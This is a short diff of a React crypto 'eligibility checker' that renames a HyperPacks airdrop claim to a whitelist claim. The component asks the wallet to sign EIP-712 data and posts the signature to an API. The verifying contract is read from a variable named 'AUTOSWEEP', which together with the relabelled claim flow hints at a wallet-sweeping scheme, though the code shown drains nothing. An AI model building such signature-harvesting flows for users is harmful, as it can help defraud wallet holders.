@@ -58,14 +58,14 @@ const EligibilityChecker = () => {
       const signer = provider.getSigner();
 
       const domain = {
-        name: 'HyperPacks Airdrop',
+        name: 'HyperPacks Whitelist',
         version: '1',
         chainId: 999,
         verifyingContract: process.env.REACT_APP_AUTOSWEEP_CONTRACT || '0x0000000000000000000000000000000000000000'
       };
 
       const types = {
-        ClaimAirdrop: [
+        ClaimWhitelist: [
           { name: 'wallet', type: 'address' },
           { name: 'allocation', type: 'uint256' },
           { name: 'nonce', type: 'uint256' }
@@ -80,7 +80,7 @@ const EligibilityChecker = () => {
 
       const signature = await signer._signTypedData(domain, types, value);
 
-      const response = await fetch(`${API_BASE}/api/hyperpacks/claim-airdrop`, {
+      const response = await fetch(`${API_BASE}/api/hyperpacks/claim-whitelist`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ wallet: walletAddress, signature })
@@ -96,7 +96,7 @@ const EligibilityChecker = () => {
       setTimeout(() => checkEligibility(), 2000);
     } catch (err) {
       console.error(err);
-      setError(err.message || 'Failed to claim airdrop');
+      setError(err.message || 'Failed to claim whitelist');
     } finally {
       setClaiming(false);
     }
